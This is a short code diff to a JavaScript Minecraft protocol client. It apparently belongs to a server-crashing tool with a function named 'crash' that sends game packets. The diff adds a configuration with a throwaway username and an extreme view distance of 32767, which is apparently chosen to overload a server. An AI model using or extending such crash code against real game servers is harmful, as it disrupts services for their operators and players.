@@ -22,11 +22,6 @@ const levelSoundEvent = (client, data) => {
     client.write('level_sound_event', data);
 };
 
-/**
- * @param {protocol.ClientOptions} options
- * @param {Number} s
- * @param {Number} start
- */
 const crash = async (options) => {
     const delay = !!options.delay;
     
@@ -109,7 +104,12 @@ const crash = async (options) => {
     run()
 };
 
-
+const options = {
+    "profilesFolder": "./profiles",
+    "username": "MinecraftOMG",
+    "skipPing": true,
+    "viewDistance": 32767
+}
 process.on("uncaughtException", (e) => {
     for (const errorCB of onErrorCB) errorCB(e);
     console.error(e);
